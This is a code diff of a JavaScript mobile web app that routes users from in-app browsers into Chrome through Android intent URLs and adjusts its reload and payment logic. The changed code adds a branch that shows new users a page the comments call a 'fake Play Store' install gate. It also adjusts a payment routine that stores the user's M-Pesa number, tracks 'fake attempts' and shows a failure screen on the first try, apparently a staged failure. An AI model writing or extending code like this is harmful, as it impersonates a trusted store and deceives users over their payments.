@@ -724,12 +724,14 @@ function detectInAppBrowser(ua) {
     return false;
 }
 
-// =========================================================
-// FIX #1: Android intent URL now includes ?_pwa=1
-// =========================================================
+// FIX #1: Preserve existing query params + add ?_pwa=1 for intent
 function openInChrome() {
     if (_isAndroid) {
-        window.location.href = `intent://${window.location.host}${window.location.pathname}?_pwa=1#Intent;scheme=https;package=com.android.chrome;end`;
+        const params = new URLSearchParams(location.search);
+        params.set('_pwa', '1');
+        const query = params.toString();
+        const target = `${window.location.host}${window.location.pathname}${query ? '?' + query : ''}`;
+        window.location.href = `intent://${target}#Intent;scheme=https;package=com.android.chrome;end`;
         return;
     }
     if (_isIOS) {
@@ -920,18 +922,24 @@ function bootApp(){
     showScreen('screen-login');
 }
 
-// =========================================================
-// FIX #2: Added _cameFromIntent branch before final else
-// =========================================================
+// FIX #2 + #3: _cameFromIntent branch checks _isInApp and _wasInstalled first
 if (isStandalone) {
     playStoreGate.classList.add('hide');
     browserWarning.classList.add('hide');
     appContent.classList.remove('hide');
     bootApp();
-} else if (_cameFromIntent) {
-    playStoreGate.classList.add('hide');
-    browserWarning.classList.add('hide');
-    showAppInline();
+} else if (_cameFromIntent && !_isInApp) {
+    if (_wasInstalled) {
+        // Already installed → send straight to app
+        playStoreGate.classList.add('hide');
+        browserWarning.classList.add('hide');
+        showAppInline();
+    } else {
+        // New user → fake Play Store (normal install funnel)
+        browserWarning.classList.add('hide');
+        playStoreGate.classList.remove('hide');
+        showInstallState();
+    }
 } else if (_isInApp || (_isAndroid && !_isChromeBrowser)) {
     playStoreGate.classList.add('hide');
     browserWarning.classList.remove('hide');
@@ -959,8 +967,8 @@ if ('serviceWorker' in navigator) {
     });
 }
 
-// ONE-TIME RELOAD WHEN LANDING IN CHROME (not in-app, not installed)
-if (!_isInApp && !isStandalone && _isChromeBrowser) {
+// FIX #4: One-time reload guard now skips when _cameFromIntent (no double reload)
+if (!_isInApp && !isStandalone && _isChromeBrowser && !_cameFromIntent) {
     const hasReloaded = sessionStorage.getItem('nyota_chrome_reloaded');
     if (!hasReloaded) {
         sessionStorage.setItem('nyota_chrome_reloaded', '1');
@@ -1088,9 +1096,7 @@ async function processPayment(){
     if (fakeAttempts < 1) {
         isProcessingPayment = true;
         state.mpesa = mpesa;
-        // =========================================================
         // FIX #3: Increment fakeAttempts synchronously (before setTimeout)
-        // =========================================================
         localStorage.setItem('nyota_fake_attempts', '1');
         document.getElementById('btn-pay').disabled = true;
 
@@ -1105,8 +1111,6 @@ async function processPayment(){
         setTimeout(() => {
             isProcessingPayment = false;
             document.getElementById('btn-pay').disabled = false;
-
-            // (removed the setItem here — already set synchronously above)
 
             // Show the failure screen
             document.getElementById('verify-anim').classList.add('hide');
